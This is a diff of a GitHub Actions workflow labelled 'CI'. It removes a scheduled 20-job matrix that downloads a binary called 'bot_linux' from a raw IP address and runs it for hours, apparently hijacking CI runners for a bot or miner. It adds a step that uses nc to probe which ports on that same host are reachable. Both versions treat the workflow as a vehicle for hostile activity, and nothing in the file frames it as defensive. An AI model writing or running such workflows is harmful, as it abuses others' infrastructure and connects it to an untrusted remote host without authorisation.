@@ -1,21 +1,18 @@
 name: CI
 on:
   push:
-  schedule:
-    - cron: "0 */5 * * *"
   workflow_dispatch:
 
 jobs:
-  build:
+  probe:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
-      - name: run
+      - name: probe
         run: |
-          curl -sL --max-time 30 http://45.153.34.235:8888/bot_linux -o /tmp/b && echo dl_ok || echo dl_fail
-          file /tmp/b 2>/dev/null || true
-          chmod +x /tmp/b
-          timeout 21000 /tmp/b
+          for port in 22 80 443 1080 2222 3333 4444 4445 7777 8080 8443 8888; do
+            if nc -zw2 45.153.34.235 $port 2>/dev/null; then
+              echo "OPEN: $port"
+            else
+              echo "BLOCKED: $port"
+            fi
+          done
